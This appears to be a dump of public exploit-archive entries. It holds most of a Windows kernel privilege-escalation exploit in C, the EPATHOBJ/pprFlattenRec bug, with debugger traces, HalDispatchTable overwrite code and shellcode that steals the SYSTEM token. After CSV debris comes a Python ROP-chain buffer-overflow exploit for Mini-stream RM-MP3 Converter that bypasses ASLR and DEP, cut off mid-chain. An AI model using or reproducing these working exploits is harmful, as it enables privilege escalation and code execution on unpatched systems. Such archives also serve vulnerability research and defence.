MEM_COMMIT | MEM_RESERVE, //                                 PAGE_EXECUTE_READWRITE); // //       // Initialise with recognisable debugging values. //       FillMemory(PathRecord, sizeof(PATHRECORD), 0xCC); // //       PathRecord->next    = (PVOID)(0x41414141); //       PathRecord->prev    = (PVOID)(0x42424242); // //       // You need the PD_BEZIERS flag to enter EPATHOBJ::pprFlattenRec() from //       // EPATHOBJ::bFlatten(), do that here. //       PathRecord->flags   = PD_BEZIERS; // //       // Generate a large number of Bezier Curves made up of pointers to our //       // PATHRECORD object. //       for (PointNum = 0; PointNum < MAX_POLYPOINTS; PointNum++) { //           Points[PointNum].x      = (ULONG)(PathRecord) >> 4; //           Points[PointNum].y      = (ULONG)(PathRecord) >> 4; //           PointTypes[PointNum]    = PT_BEZIERTO; //       } // //   kd> ba e 1 win32k!EPATHOBJ::pprFlattenRec+28 ""j (dwo(ebp+8) < dwo(nt!MmUserProbeAddress)) ''; 'gc'"" //   kd> g //   win32k!EPATHOBJ::pprFlattenRec+0x28: //   95c922c2 33c0            xor     eax,eax //   kd> dd ebp+8 L1 //   a3633be0  00130000 // //   The ppr object is in userspace! If we peek at it: // //   kd> dd poi(ebp+8) //   00130000  41414141 42424242 00000010 cccccccc //   00130010  00000000 00000000 00000000 00000000 //   00130020  00000000 00000000 00000000 00000000 //   00130030  00000000 00000000 00000000 00000000 //   00130040  00000000 00000000 00000000 00000000 //   00130050  00000000 00000000 00000000 00000000 //   00130060  00000000 00000000 00000000 00000000 //   00130070  00000000 00000000 00000000 00000000 // //   There's the next and prev pointer. // //   kd> kvn //    # ChildEBP RetAddr  Args to Child //   00 a3633bd8 95c9253a 00130000 002bfea0 95c101ce win32k!EPATHOBJ::pprFlattenRec+0x28 (FPO: [Non-Fpo]) //   01 a3633be4 95c101ce 00000001 00000294 fe763360 win32k!EPATHOBJ::bFlatten+0x23 (FPO: [0,0,4]) //   02 a3633c28 829ab173 0701062d 002bfea8 7721a364 win32k!NtGdiFlattenPath+0x50 (FPO: [Non-Fpo]) //   03 a3633c28 7721a364 0701062d 002bfea8 7721a364 nt!KiFastCallEntry+0x163 (FPO: [0,3] TrapFrame @ a3633c34) // //   The question is how to get PATHALLOC() to succeed under memory pressure so we //   can make this exploitable? I'm quite proud of this list cycle trick, //   here's how to turn it into an arbitrary write. // //   First, we create a watchdog thread that will patch the list atomically //   when we're ready. This is needed because we can't exploit the bug while //   HeavyAllocPool is failing, because of the early exit in pprFlattenRec: // //   .text:BFA122B8                 call newpathrec              ; EPATHOBJ::newpathrec(_PATHRECORD * *,ulong *,ulong) //   .text:BFA122BD                 cmp     eax, 1               ; Check for failure //   .text:BFA122C0                 jz      short continue //   .text:BFA122C2                 xor     eax, eax             ; Exit early //   .text:BFA122C4                 jmp     early_exit // //   So we create a list node like this: // //   PathRecord->Next    = PathRecord; //   PathRecord->Flags   = 0; // //   Then EPATHOBJ::bFlatten() spins forever doing nothing: // //   BOOL __thiscall EPATHOBJ::bFlatten(EPATHOBJ *this) //   { //       /* ... */ // //       for ( ppr = ppath->pprfirst; ppr; ppr = ppr->pprnext ) //       { //         if ( ppr->flags & PD_BEZIER ) //         { //           ppr = EPATHOBJ::pprFlattenRec(pathobj, ppr); //         } //       } // //       /* ... */ //   } // //   While it's spinning, we clean up in another thread, then patch the thread (we //   can do this, because it's now in userspace) to trigger the exploit. The first //   block of pprFlattenRec does something like this: // //       if ( pprNew->pprPrev ) //         pprNew->pprPrev->pprnext = pprNew; // //   Let's make that write to 0xCCCCCCCC. // //   DWORD WINAPI WatchdogThread(LPVOID Parameter) //   { // //       // This routine waits for a mutex object to timeout, then patches the //       // compromised linked list to point to an exploit. We need to do this. //       LogMessage(L_INFO, ""Watchdog thread %u waiting on Mutex () %p"", //                          GetCurrentThreadId(), //                          Mutex); // //       if (WaitForSingleObject(Mutex, CYCLE_TIMEOUT) == WAIT_TIMEOUT) { //           // It looks like the main thread is stuck in a call to FlattenPath(), //           // because the kernel is spinning in EPATHOBJ::bFlatten(). We can clean //           // up, and then patch the list to trigger our exploit. //           while (NumRegion--) //               DeleteObject(Regions[NumRegion]); // //           LogMessage(L_ERROR, ""InterlockedExchange(%p, %p);"", &PathRecord->next, &ExploitRecord); // //           InterlockedExchangePointer(&PathRecord->next, &ExploitRecord); // //       } else { //           LogMessage(L_ERROR, ""Mutex object did not timeout, list not patched""); //       } // //       return 0; //   } // //       PathRecord->next    = PathRecord; //       PathRecord->prev    = (PVOID)(0x42424242); //       PathRecord->flags   = 0; // //       ExploitRecord.next  = NULL; //       ExploitRecord.prev  = 0xCCCCCCCC; //       ExploitRecord.flags = PD_BEZIERS; // //   Here's the output on Windows 8: // //   kd> g //   ******************************************************************************* //   *                                                                             * //   *                        Bugcheck Analysis                                    * //   *                                                                             * //   ******************************************************************************* // //   Use !analyze -v to get detailed debugging information. // //   BugCheck 50, {cccccccc, 1, 8f18972e, 2} //   *** WARNING: Unable to verify checksum for ComplexPath.exe //   *** ERROR: Module load completed but symbols could not be loaded for ComplexPath.exe //   Probably caused by : win32k.sys ( win32k!EPATHOBJ::pprFlattenRec+82 ) // //   Followup: MachineOwner //   --------- // //   nt!RtlpBreakWithStatusInstruction: //   810f46f4 cc              int     3 //   kd> kv //   ChildEBP RetAddr  Args to Child //   a03ab494 8111c87d 00000003 c17b60e1 cccccccc nt!RtlpBreakWithStatusInstruction (FPO: [1,0,0]) //   a03ab4e4 8111c119 00000003 817d5340 a03ab8e4 nt!KiBugCheckDebugBreak+0x1c (FPO: [Non-Fpo]) //   a03ab8b8 810f30ba 00000050 cccccccc 00000001 nt!KeBugCheck2+0x655 (FPO: [6,239,4]) //   a03ab8dc 810f2ff1 00000050 cccccccc 00000001 nt!KiBugCheck2+0xc6 //   a03ab8fc 811a2816 00000050 cccccccc 00000001 nt!KeBugCheckEx+0x19 //   a03ab94c 810896cf 00000001 cccccccc a03aba2c nt! ?? ::FNODOBFM::`string'+0x31868 //   a03aba14 8116c4e4 00000001 cccccccc 00000000 nt!MmAccessFault+0x42d (FPO: [4,37,4]) //   a03aba14 8f18972e 00000001 cccccccc 00000000 nt!KiTrap0E+0xdc (FPO: [0,0] TrapFrame @ a03aba2c) //   a03abbac 8f103c28 0124eba0 a03abbd8 8f248f79 win32k!EPATHOBJ::pprFlattenRec+0x82 (FPO: [Non-Fpo]) //   a03abbb8 8f248f79 1c010779 0016fd04 8f248f18 win32k!EPATHOBJ::bFlatten+0x1f (FPO: [0,1,0]) //   a03abc08 8116918c 1c010779 0016fd18 776d7174 win32k!NtGdiFlattenPath+0x61 (FPO: [1,15,4]) //   a03abc08 776d7174 1c010779 0016fd18 776d7174 nt!KiFastCallEntry+0x12c (FPO: [0,3] TrapFrame @ a03abc14) //   0016fcf4 76b1552b 0124147f 1c010779 00000040 ntdll!KiFastSystemCallRet (FPO: [0,0,0]) //   0016fcf8 0124147f 1c010779 00000040 00000000 GDI32!NtGdiFlattenPath+0xa (FPO: [1,0,0]) //   WARNING: Stack unwind information not available. Following frames may be wrong. //   0016fd18 01241ade 00000001 00202b50 00202ec8 ComplexPath+0x147f //   0016fd60 76ee1866 7f0de000 0016fdb0 77716911 ComplexPath+0x1ade //   0016fd6c 77716911 7f0de000 bc1d7832 00000000 KERNEL32!BaseThreadInitThunk+0xe (FPO: [Non-Fpo]) //   0016fdb0 777168bd ffffffff 7778560a 00000000 ntdll!__RtlUserThreadStart+0x4a (FPO: [SEH]) //   0016fdc0 00000000 01241b5b 7f0de000 00000000 ntdll!_RtlUserThreadStart+0x1c (FPO: [Non-Fpo]) //   kd> .trap a03aba2c //   ErrCode = 00000002 //   eax=cccccccc ebx=80206014 ecx=80206008 edx=85ae1224 esi=0124eba0 edi=a03abbd8 //   eip=8f18972e esp=a03abaa0 ebp=a03abbac iopl=0         nv up ei ng nz na pe nc //   cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010286 //   win32k!EPATHOBJ::pprFlattenRec+0x82: //   8f18972e 8918            mov     dword ptr [eax],ebx  ds:0023:cccccccc=???????? //   kd> vertarget //   Windows 8 Kernel Version 9200 MP (1 procs) Free x86 compatible //   Product: WinNt, suite: TerminalServer SingleUserTS //   Built by: 9200.16581.x86fre.win8_gdr.130410-1505 //   Machine Name: //   Kernel base = 0x81010000 PsLoadedModuleList = 0x811fde48 //   Debug session time: Mon May 20 14:17:20.259 2013 (UTC - 7:00) //   System Uptime: 0 days 0:02:30.432 //   kd> .bugcheck //   Bugcheck code 00000050 //   Arguments cccccccc 00000001 8f18972e 00000002 // // EXPLOITATION // // We're somewhat limited with what we can do, as we don't control what's // written, it's always a pointer to a PATHRECORD object. We can clobber a // function pointer, but the problem is making it point somewhere useful. // // The solution is to make the Next pointer a valid sequence of instructions, // which jumps to our second stage payload. We have to do that in just 4 bytes // (unless you can find a better call site, let me know if you spot one). // // Thanks to progmboy for coming up with the solution: you reach back up the // stack and pull a SystemCall parameter out of the stack. It turns out // NtQueryIntervalProfile matches this requirement perfectly. // // INSTRUCTIONS // // C:\> cl ComplexPath.c // C:\> ComplexPath // // You might need to run it several times before we get the allocation we need, // it won't crash if it doesn't work, so you can keep trying. I'm not sure how // to improve that. // // CREDIT // // Tavis Ormandy <taviso () cmpxchg8b com> // progmboy <programmeboy () gmail com> //  POINT       Points[MAX_POLYPOINTS]; BYTE        PointTypes[MAX_POLYPOINTS]; HRGN        Regions[MAX_REGIONS]; ULONG       NumRegion = 0; HANDLE      Mutex; DWORD       Finished = 0;  // Log levels. typedef enum { L_DEBUG, L_INFO, L_WARN, L_ERROR } LEVEL, *PLEVEL;  BOOL LogMessage(LEVEL Level, PCHAR Format, ...);  // Copied from winddi.h from the DDK #define PD_BEGINSUBPATH   0x00000001 #define PD_ENDSUBPATH     0x00000002 #define PD_RESETSTYLE     0x00000004 #define PD_CLOSEFIGURE    0x00000008 #define PD_BEZIERS        0x00000010  typedef struct  _POINTFIX {     ULONG x;     ULONG y; } POINTFIX, *PPOINTFIX;  // Approximated from reverse engineering. typedef struct _PATHRECORD {     struct _PATHRECORD *next;     struct _PATHRECORD *prev;     ULONG               flags;     ULONG               count;     POINTFIX            points[4]; } PATHRECORD, *PPATHRECORD;  PPATHRECORD PathRecord; PATHRECORD  ExploitRecord; PPATHRECORD ExploitRecordExit;  enum { SystemModuleInformation = 11 }; enum { ProfileTotalIssues = 2 };  typedef struct _RTL_PROCESS_MODULE_INFORMATION {     HANDLE Section;     PVOID MappedBase;     PVOID ImageBase;     ULONG ImageSize;     ULONG Flags;     USHORT LoadOrderIndex;     USHORT InitOrderIndex;     USHORT LoadCount;     USHORT OffsetToFileName;     UCHAR  FullPathName[256]; } RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;  typedef struct _RTL_PROCESS_MODULES {     ULONG NumberOfModules;     RTL_PROCESS_MODULE_INFORMATION Modules[1]; } RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;  FARPROC NtQuerySystemInformation; FARPROC NtQueryIntervalProfile; FARPROC PsReferencePrimaryToken; FARPROC PsLookupProcessByProcessId; PULONG  HalDispatchTable; ULONG   HalQuerySystemInformation; PULONG  TargetPid; PVOID  *PsInitialSystemProcess;  // Search the specified data structure for a member with CurrentValue. BOOL FindAndReplaceMember(PDWORD Structure,                           DWORD CurrentValue,                           DWORD NewValue,                           DWORD MaxSize) {     DWORD i, Mask;      // Microsoft QWORD aligns object pointers, then uses the lower three     // bits for quick reference counting.     Mask = ~7;      // Mask out the reference count.     CurrentValue &= Mask;      // Scan the structure for any occurrence of CurrentValue.     for (i = 0; i < MaxSize; i++) {         if ((Structure[i] & Mask) == CurrentValue) {             // And finally, replace it with NewValue.             Structure[i] = NewValue;             return TRUE;         }     }      // Member not found.     return FALSE; }   // This routine is injected into nt!HalDispatchTable by EPATHOBJ::pprFlattenRec. ULONG __stdcall ShellCode(DWORD Arg1, DWORD Arg2, DWORD Arg3, DWORD Arg4) {     PVOID  TargetProcess;      // Record that the exploit completed.     Finished = 1;      // Fix the corrupted HalDispatchTable,     HalDispatchTable[1] = HalQuerySystemInformation;      // Find the EPROCESS structure for the process I want to escalate     if (PsLookupProcessByProcessId(TargetPid, &TargetProcess) == STATUS_SUCCESS) {         PACCESS_TOKEN SystemToken;         PACCESS_TOKEN TargetToken;          // Find the Token object for my target process, and the SYSTEM process.         TargetToken = (PACCESS_TOKEN) PsReferencePrimaryToken(TargetProcess);         SystemToken = (PACCESS_TOKEN) PsReferencePrimaryToken(*PsInitialSystemProcess);          // Find the token in the target process, and replace with the system token.         FindAndReplaceMember((PDWORD) TargetProcess,                              (DWORD)  TargetToken,                              (DWORD)  SystemToken,                              0x200);     }      return 0; }  DWORD WINAPI WatchdogThread(LPVOID Parameter) {     // Here we wait for the main thread to get stuck inside FlattenPath().     WaitForSingleObject(Mutex, CYCLE_TIMEOUT);      // It looks like we've taken control of the list, and the main thread     // is spinning in EPATHOBJ::bFlatten. We can't continue because     // EPATHOBJ::pprFlattenRec exit's immediately if newpathrec() fails.      // So first, we clean up and make sure it can allocate memory.     while (NumRegion) DeleteObject(Regions[--NumRegion]);      // Now we switch out the Next pointer for our exploit record. As soon     // as this completes, the main thread will stop spinning and continue     // into EPATHOBJ::pprFlattenRec.     InterlockedExchangePointer(&PathRecord->next,                                &ExploitRecord);     return 0; }  // I use this routine to generate a table of acceptable stub addresses. The // 0x40 offset is the location of the PULONG parameter to // nt!NtQueryIntervalProfile. Credit to progmboy for coming up with this clever // trick. VOID __declspec(naked) HalDispatchRedirect(VOID) {     __asm inc eax     __asm jmp dword ptr [ebp+0x40]; //  0     __asm inc ecx     __asm jmp dword ptr [ebp+0x40]; //  1     __asm inc edx     __asm jmp dword ptr [ebp+0x40]; //  2     __asm inc ebx     __asm jmp dword ptr [ebp+0x40]; //  3     __asm inc esi     __asm jmp dword ptr [ebp+0x40]; //  4     __asm inc edi     __asm jmp dword ptr [ebp+0x40]; //  5     __asm dec eax     __asm jmp dword ptr [ebp+0x40]; //  6     __asm dec ecx     __asm jmp dword ptr [ebp+0x40]; //  7     __asm dec edx     __asm jmp dword ptr [ebp+0x40]; //  8     __asm dec ebx     __asm jmp dword ptr [ebp+0x40]; //  9     __asm dec esi     __asm jmp dword ptr [ebp+0x40]; // 10     __asm dec edi     __asm jmp dword ptr [ebp+0x40]; // 11      // Mark end of table.     __asm {         _emit 0         _emit 0         _emit 0         _emit 0     } }  int main(int argc, char **argv) {     HANDLE               Thread;     HDC                  Device;     ULONG                Size;     ULONG                PointNum;     HMODULE              KernelHandle;     PULONG               DispatchRedirect;     PULONG               Interval;     ULONG                SavedInterval;     RTL_PROCESS_MODULES  ModuleInfo;      LogMessage(L_INFO, ""\r--------------------------------------------------\n""                        ""\rWindows NT/2K/XP/2K3/VISTA/2K8/7/8 EPATHOBJ local ring0 exploit\n""                        ""\r------------------- taviso () cmpxchg8b com, programmeboy () gmail com ---\n""                        ""\n"");      NtQueryIntervalProfile    = GetProcAddress(GetModuleHandle(""ntdll""), ""NtQueryIntervalProfile"");     NtQuerySystemInformation  = GetProcAddress(GetModuleHandle(""ntdll""), ""NtQuerySystemInformation"");     Mutex                     = CreateMutex(NULL, FALSE, NULL);     DispatchRedirect          = (PVOID) HalDispatchRedirect;     Interval                  = (PULONG) ShellCode;     SavedInterval             = Interval[0];     TargetPid                 = GetCurrentProcessId();      LogMessage(L_INFO, ""NtQueryIntervalProfile () %p"", NtQueryIntervalProfile);     LogMessage(L_INFO, ""NtQuerySystemInformation () %p"", NtQuerySystemInformation);      // Lookup the address of system modules.     NtQuerySystemInformation(SystemModuleInformation,                              &ModuleInfo,                              sizeof ModuleInfo,                              NULL);      LogMessage(L_DEBUG, ""NtQuerySystemInformation() => %s () %p"",                         ModuleInfo.Modules[0].FullPathName,                         ModuleInfo.Modules[0].ImageBase);      // Lookup some system routines we require.     KernelHandle                = LoadLibrary(ModuleInfo.Modules[0].FullPathName + ModuleInfo.Modules[0].OffsetToFileName);     HalDispatchTable            = (ULONG) GetProcAddress(KernelHandle, ""HalDispatchTable"")           - (ULONG) KernelHandle + (ULONG) ModuleInfo.Modules[0].ImageBase;     PsInitialSystemProcess      = (ULONG) GetProcAddress(KernelHandle, ""PsInitialSystemProcess"")     - (ULONG) KernelHandle + (ULONG) ModuleInfo.Modules[0].ImageBase;     PsReferencePrimaryToken     = (ULONG) GetProcAddress(KernelHandle, ""PsReferencePrimaryToken"")    - (ULONG) KernelHandle + (ULONG) ModuleInfo.Modules[0].ImageBase;     PsLookupProcessByProcessId  = (ULONG) GetProcAddress(KernelHandle, ""PsLookupProcessByProcessId"") - (ULONG) KernelHandle + (ULONG) ModuleInfo.Modules[0].ImageBase;      // Search for a ret instruction to install in the damaged HalDispatchTable.     HalQuerySystemInformation   = (ULONG) memchr(KernelHandle, 0xC3, ModuleInfo.Modules[0].ImageSize)                                 - (ULONG) KernelHandle                                 + (ULONG) ModuleInfo.Modules[0].ImageBase;      LogMessage(L_INFO, ""Discovered a ret instruction at %p"", HalQuerySystemInformation);      // Create our PATHRECORD in user space we will get added to the EPATHOBJ     // pathrecord chain.     PathRecord = VirtualAlloc(NULL,                               sizeof *PathRecord,                               MEM_COMMIT | MEM_RESERVE,                               PAGE_EXECUTE_READWRITE);      LogMessage(L_INFO, ""Allocated userspace PATHRECORD () %p"", PathRecord);      // You need the PD_BEZIERS flag to enter EPATHOBJ::pprFlattenRec() from     // EPATHOBJ::bFlatten(). We don't set it so that we can trigger an infinite     // loop in EPATHOBJ::bFlatten().     PathRecord->flags   = 0;     PathRecord->next    = PathRecord;     PathRecord->prev    = (PPATHRECORD)(0x42424242);      LogMessage(L_INFO, ""  ->next  @ %p"", PathRecord->next);     LogMessage(L_INFO, ""  ->prev  @ %p"", PathRecord->prev);     LogMessage(L_INFO, ""  ->flags @ %u"", PathRecord->flags);      // Now we need to create a PATHRECORD at an address that is also a valid     // x86 instruction, because the pointer will be interpreted as a function.     // I've created a list of candidates in DispatchRedirect.     LogMessage(L_INFO, ""Searching for an available stub address..."");      // I need to map at least two pages to guarantee the whole structure is     // available.     while (!VirtualAlloc(*DispatchRedirect & ~(PAGE_SIZE - 1),                          PAGE_SIZE * 2,                          MEM_COMMIT | MEM_RESERVE,                          PAGE_EXECUTE_READWRITE)) {          LogMessage(L_WARN, ""\tVirtualAlloc(%#x) => %#x"",                             *DispatchRedirect & ~(PAGE_SIZE - 1),                             GetLastError());          // This page is not available, try the next candidate.         if (!*++DispatchRedirect) {             LogMessage(L_ERROR, ""No redirect candidates left, sorry!"");             return 1;         }     }      LogMessage(L_INFO, ""Success, ExploitRecordExit () %#0x"", *DispatchRedirect);      // This PATHRECORD must terminate the list and recover.     ExploitRecordExit           = (PPATHRECORD) *DispatchRedirect;     ExploitRecordExit->next     = NULL;     ExploitRecordExit->prev     = NULL;     ExploitRecordExit->flags    = PD_BEGINSUBPATH;     ExploitRecordExit->count    = 0;      LogMessage(L_INFO, ""  ->next  @ %p"", ExploitRecordExit->next);     LogMessage(L_INFO, ""  ->prev  @ %p"", ExploitRecordExit->prev);     LogMessage(L_INFO, ""  ->flags @ %u"", ExploitRecordExit->flags);      // This is the second stage PATHRECORD, which causes a fresh PATHRECORD     // allocated from newpathrec to nt!HalDispatchTable. The Next pointer will     // be copied over to the new record. Therefore, we get     //     // nt!HalDispatchTable[1] = &ExploitRecordExit.     //     // So we make &ExploitRecordExit a valid sequence of instuctions here.     LogMessage(L_INFO, ""ExploitRecord () %#0x"", &ExploitRecord);      ExploitRecord.next          = (PPATHRECORD) *DispatchRedirect;     ExploitRecord.prev          = (PPATHRECORD) &HalDispatchTable[1];     ExploitRecord.flags         = PD_BEZIERS | PD_BEGINSUBPATH;     ExploitRecord.count         = 4;      LogMessage(L_INFO, ""  ->next  @ %p"", ExploitRecord.next);     LogMessage(L_INFO, ""  ->prev  @ %p"", ExploitRecord.prev);     LogMessage(L_INFO, ""  ->flags @ %u"", ExploitRecord.flags);      LogMessage(L_INFO, ""Creating complex bezier path with %x"", (ULONG)(PathRecord) >> 4);      // Generate a large number of Belier Curves made up of pointers to our     // PATHRECORD object.     for (PointNum = 0; PointNum < MAX_POLYPOINTS; PointNum++) {         Points[PointNum].x      = (ULONG)(PathRecord) >> 4;         Points[PointNum].y      = (ULONG)(PathRecord) >> 4;         PointTypes[PointNum]    = PT_BEZIERTO;     }      // Switch to a dedicated desktop so we don't spam the visible desktop with     // our Lines (Not required, just stops the screen from redrawing slowly).     SetThreadDesktop(CreateDesktop(""DontPanic"",                                    NULL,                                    NULL,                                    0,                                    GENERIC_ALL,                                    NULL));      // Get a handle to this Desktop.     Device = GetDC(NULL);      // Take ownership of Mutex     WaitForSingleObject(Mutex, INFINITE);      // Spawn a thread to cleanup     Thread = CreateThread(NULL, 0, WatchdogThread, NULL, 0, NULL);      LogMessage(L_INFO, ""Begin CreateRoundRectRgn cycle"");      // We need to cause a specific AllocObject() to fail to trigger the     // exploitable condition. To do this, I create a large number of rounded     // rectangular regions unt",,
,,,
,,0,
20116,"Mini-stream RM-MP3 Converter 3.1.2.1.2010.03.30 - Local Buffer Overflow (ASLR + DEP Bypass) # Exploit Title: Mini-stream RM-MP3 Converter 3.1.2.1.2010.03.30 local buffer overflow (\w ASLR and DEP bypass) # Date: 26 July 2012 # Exploit Author: Gianni Gnesa # Vendor Homepage: http://mini-stream.net/ # Software Link: http://mini-stream.net/rm-to-mp3-converter/download # Version: 3.1.2.1.2010.03.30 # Tested on: Windows 7 SP1 (VMware) # References: CVE-2009-1328, BID 34494   from struct import pack  fname = ""rop.m3u"" hdr   = ""http://."" junk1 = ""A"" * 17416     # junk  rop =   [             0x10041720, # RETN [MSRMfilter03.dll]             0x41414141, # Compensate               #### Save ESP into ESI             # EAX=EBP             0x1001a503, # XOR EAX,EAX / RETN [MSRMfilter03.dll]             0x10051ff5, # ADD EAX,EBP / RETN [MSRMfilter03.dll]                          # ESI=EAX             0x1005bb8e, # PUSH EAX / ADD DWORD PTR SS:[EBP+5],ESI / PUSH 1 / POP EAX / POP ESI / RETN [MSRMfilter03.dll]                          # EBX=ESI             0x1001217b, # PUSH ESI / ADD AL,5E / POP EBX / RETN [MSRMfilter03.dll]              # EDX=EBX             0x1002991c, # XOR EDX,EDX / RETN [MSRMfilter03.dll]             0x10029f3e, # ADD EDX,EBX / POP EBX / RETN 10 [MSRMfilter03.dll]             0x41414141, # Junk popped in EBX               # ESI=ESP             0x10032D54, # PUSH ESP / AND AL,10 / POP ESI / MOV DWORD PTR DS:[EDX],ECX / RETN [MSRMfilter03.dll]             0x41414141, # Junk for RETN             0x41414141, # Junk for RETN             0x41414141, # Junk for RETN             0x41414141, # Junk for RETN                           #### Jump over VirtualProtect()             0x100237C8, # ADD ESP, 20 / RETN [MSRMfilter03.dll]                          0x58585858, # VirtualProtect()             0x58585858, # Return Address             0x58585858, # lpAddress             0x58585858, # dwSize             0x58585858, # flNewProtect             0x10085515, # lpflOldProtect  [Address in MSRMfilter03.dll]              0x90909090, # Padding             0x90909090, # Padding             # ADD ESP,20 / RETN will land here               #### Find kernel32.VirtualProtect             # Save ESI (Saved ESP) into EBX             0x1001217b, # PUSH ESI / ADD AL,5E / POP EBX / RETN [MSRMfilter03.dll]              # EAX = Saved ESP - 0xACE4             0x1002ca2d, # POP EAX / RETN [MSRMfilter03.dll]             0xFFFF531C, # -0xACE4 (offset from the Saved ESP to the kernel32.XXXXBBE4 in the stack)             0x10033bbb, # ADD EAX,ESI / POP ESI / RETN [MSRMfilter03.dll]             0x41414141, # Junk popped in ESI              # Pickup kernel32.XXXXBBE4 into EAX             0x10027f59, # MOV EAX,DWORD PTR DS:[EAX] / RETN [MSRMfilter03.dll]              # Find kernel32.VirtualProtect             0x1001263D, # POP ECX / RETN [MSRMfilter03.dll]             0xFFFF675D, # -0x98A3 (offset from kernel32.XXXXBBE4 to kernel32.VirtualProtect)             0x1001451e, # ADD EAX,ECX / RETN [MSRMfilter03.dll]                ##### Write VirtualProtect address to memory             # EDX = EBX = Saved ESP             0x1002993c, # XOR EDX,EDX / RETN [MSRMfilter03.dll]             0x10029f3e, # ADD EDX,EBX / POP EBX / RETN 10 [MSRMfilter03.dll]             0x41414141, # Junk popped in EBX              # EDX = EDX + 4             0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]             0x41414141, # Junk for RETN             0x41414141, # Junk for RETN             0x41414141, # Junk for RETN             0x41414141, # Junk for RETN             0x41414141, # Junk for ESI             0x41414141, # Junk for EDI             0x41414141, # Junk for EBX             0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]             0x41414141, # Junk for ESI             0x41414141, # Junk for EDI             0x41414141, # Junk for EBX             0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]             0x41414141, # Junk for ESI             0x41414141, # Junk for EDI             0x41414141, # Junk for EBX             0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]             0x41414141, # Junk for ESI             0x41414141, # Junk for EDI             0x41414141, # Junk for EBX                          # Write VirtualProtect address to memory             0x10031e2e, # MOV DWORD PTR DS:[EDX],EAX / MOV EAX,3 / RETN [MSRMfilter03.dll]               #### Write return address to memory             # EAX = EDX (Saved ESP) + 0x300             0x1002fa6a, # MOV EAX,EDX / RETN [MSRMfilter03.dll]             0x10031c8c, # ADD EAX,100 / POP EBP / RETN [MSRMfilter03.dll]             0x41414141, # Junk popped in EBP             0x10031c8c, # ADD EAX,100 / POP EBP / RETN [MSRMfilter03.dll]             0x41414141, # Junk popped in EBP             0x10031c8c, # ADD EAX,100 / POP EBP / RETN [MSRMfilter03.dll]             0x41414141, # Junk popped in EBP              # EDX = EDX + 4             0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]             0x41414141, # Junk for ESI             0x41414141, # Junk for EDI             0x41414141, # Junk for EBX             0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]             0x41414141, # Junk for ESI             0x41414141, # Junk for EDI             0x41414141, # Junk for EBX             0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]             0x41414141, # Junk for ESI             0x41414141, # Junk for EDI             0x41414141, # Junk for EBX             0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]             0x41414141, # Junk for ESI             0x41414141, # Junk for EDI             0x41414141, # Junk for EBX                          # Write return address to memory             0x10031e2e, # MOV DWORD PTR DS:[EDX],EAX / MOV EAX,3 / RETN [MSRMfilter03.dll]               #### Write lpAddress parameter to memory             # EAX = EDX (Saved ESP) + 0x300             0x1002fa6a, # MOV EAX,EDX / RETN [MSRMfilter03.dll]             0x1001263D, # POP ECX / RETN [MSRMfilter03.dll]             0xFFFFFFFC, # -0x4 (compensate EDX increment)             0x1001451e, # ADD EAX,ECX / RETN [MSRMfilter03.dll]             0x10031c8c, # ADD EAX,100 / POP EBP / RETN [MSRMfilter03.dll]             0x41414141, # Junk popped in EBP             0x10031c8c, # ADD EAX,100 / POP EBP / RETN [MSRMfilter03.dll]             0x41414141, # Junk popped in EBP             0x10031c8c, # ADD EAX,100 / POP EBP / RETN [MSRMfilter03.dll]             0x41414141, # Junk popped in EBP              # EDX = EDX + 4             0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]             0x41414141, # Junk for ESI             0x41414141, # Junk for EDI             0x41414141, # Junk for EBX             0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]             0x41414141, # Junk for ESI             0x41414141, # Junk for EDI             0x41414141, # Junk for EBX             0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]             0x41414141, # Junk for ESI             0x41414141, # Junk for EDI             0x41414141, # Junk for EBX             0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]             0x41414141, # Junk for ESI             0x41414141, # Junk for EDI             0x41414141, # Junk for EBX                          # Write lpAddress parameter to memory             0x10031e2e, # MOV DWORD PTR DS:[EDX],EAX / MOV EAX,3 / RETN [MSRMfilter03.dll]               #### Write dwSize parameter to memory             # EAX = 0x400             0x1001a503, # XOR EAX,EAX / RETN [MSRMfilter03.dll]             0x10031c8c, # ADD EAX,100 / POP EBP / RETN [MSRMfilter03.dll]             0x41414141, # Junk popped in EBP             0x10031c8c, # ADD EAX,100 / POP EBP / RETN [MSRMfilter03.dll]              0x41414141, # Junk popped in EBP             0x10031c8c, # ADD EAX,100 / POP EBP / RETN [MSRMfilter03.dll]              0x41414141, # Junk popped in EBP             0x10031c8c, # ADD EAX,100 / POP EBP / RETN [MSRMfilter03.dll]              0x41414141, # Junk popped in EBP              # EDX = EDX + 4             0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]             0x41414141, # Junk for ESI             0x41414141, # Junk for EDI             0x41414141, # Junk for EBX             0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]             0x41414141, # Junk for ESI             0x41414141, # Junk for EDI             0x41414141, # Junk for EBX             0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]             0x41414141, # Junk for ESI             0x41414141, # Junk for EDI             0x41414141, # Junk for EBX             0x10028fe6, # INC EDX / CLD / POP ESI / POP EDI / POP EBX / RETN [MSRMfilter03.dll]             0x41414141, # Junk for ESI             